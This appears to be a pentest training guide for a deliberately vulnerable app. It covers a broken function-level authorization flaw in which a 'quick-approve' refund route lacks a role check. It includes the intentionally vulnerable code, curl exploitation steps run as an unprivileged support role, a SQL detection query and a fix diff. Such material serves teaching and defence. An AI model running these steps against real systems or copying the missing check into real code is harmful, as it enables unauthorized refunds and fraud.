# API5 — Broken Function Level Authorization · VulnMNO Pentest Guide

> **Status: live — implemented and verified.** The exploitation steps below
> were run against a live instance (admin portal) and the outputs shown are
> real.

OWASP API Security reference: **API5:2023 — Broken Function Level
Authorization.**

## Where it lives

- **Endpoint:** `POST /admin/refunds/{refundId}/quick-approve`
- **Code:** `app/admin/routers/refunds.py::refund_quick_approve`

```python
@router.post("/{refundId}/quick-approve")
async def refund_quick_approve(
    request: Request,
    refundId: str,
    admin: Annotated[AdminUser, Depends(get_current_admin)],
    session: Annotated[AsyncSession, Depends(get_session)],
    _: Annotated[None, Depends(require_csrf)],
):
    ...
    refund.status = "approved"
    await credit_wallet_for_refund(session, refund=refund)
    ...
```

## Why it is API5

Compare with the sibling route in the same file:

```python
@router.post("/{refundId}/approve")
async def refund_approve(
    ...,
    admin: Annotated[AdminUser, Depends(require_module(Module.REFUND_WORKFLOW, Access.READ_WRITE))],
    ...
```

`refund_approve` requires the `REFUND_WORKFLOW` module at `READ_WRITE`.
`refund_quick_approve` performs the **same** privileged action (flips a
refund to `approved`, credits the customer's wallet) but only depends on
`get_current_admin` — "is there a valid admin session at all," with no
role/module check. Every admin role can reach it, including ones the
permissions model explicitly excludes from refunds.

## How to find it (static analysis)

```bash
grep -n "@router\.\|Depends(" src/backend/app/admin/routers/refunds.py
```

`refund_quick_approve` is the only route in the file whose admin dependency
is `get_current_admin` instead of `require_module(...)`.

## Verified exploitation (actual run)

Setup: customer `+34600000001` bought a bundle (`PUR-90001`) and filed a
refund request (`POST /api/accounts/me/refunds`), creating `REF-10001` in
`pending` status. Logged into the admin portal as **`support`**
(`role: support_agent` — has no grant on `REFUND_WORKFLOW` at all).

```bash
# Control: the real approve endpoint correctly refuses this role
curl -s -o /dev/null -w '%{http_code}\n' -b cookies.txt -X POST \
  http://localhost:8000/admin/refunds/REF-10001/approve \
  --data-urlencode "csrf_token=$CSRF" --data-urlencode "note=x" --data-urlencode "auto_close=true"
```
```
403
{"error":"ADMIN_FORBIDDEN"} — "Role 'support_agent' lacks RW on 'refund_workflow'"
```

```bash
# Exploit: same support_agent session, quick-approve instead
curl -s -o /dev/null -w '%{http_code}\n' -b cookies.txt -X POST \
  http://localhost:8000/admin/refunds/REF-10001/quick-approve \
  --data-urlencode "csrf_token=$CSRF"
```
```
303   (success redirect — identical to what refund_approve returns on success)
```

Cross-checked by logging in as `billing` (a role that **does** have
`REFUND_WORKFLOW`) and reading the refunds list — `REF-10001` shows:

```html
<td><code>REF-10001</code></td>
<td><code>CUST-1</code></td>
<td>purchase <code>PUR-90001</code></td>
<td><span class="badge badge-status status-approved">approved</span></td>
```

`support_agent` — a role with zero refund permissions — successfully
approved a real refund and triggered a real wallet credit.

## Blue-team detection

```sql
-- ADMIN_REFUND_APPROVED audit events whose actor's role has no
-- REFUND_WORKFLOW grant per the permissions table
SELECT a.event_type, a.actor_id, au.role
FROM admin_audit_log a
JOIN admin_users au ON au.public_id = a.actor_id
WHERE a.event_type = 'ADMIN_REFUND_APPROVED' AND au.role NOT IN ('billing_operator', 'ops_admin');
```

The `payload: {"via": "quick-approve"}` recorded on the audit event
(`app/admin/routers/refunds.py::refund_quick_approve`) also flags every use
of this route directly.

## Remediation diff

```diff
 async def refund_quick_approve(
     request: Request,
     refundId: str,
-    admin: Annotated[AdminUser, Depends(get_current_admin)],
+    admin: Annotated[AdminUser, Depends(require_module(Module.REFUND_WORKFLOW, Access.READ_WRITE))],
     session: Annotated[AsyncSession, Depends(get_session)],
     _: Annotated[None, Depends(require_csrf)],
 ):
```

Same dependency every sibling route in the file already uses.
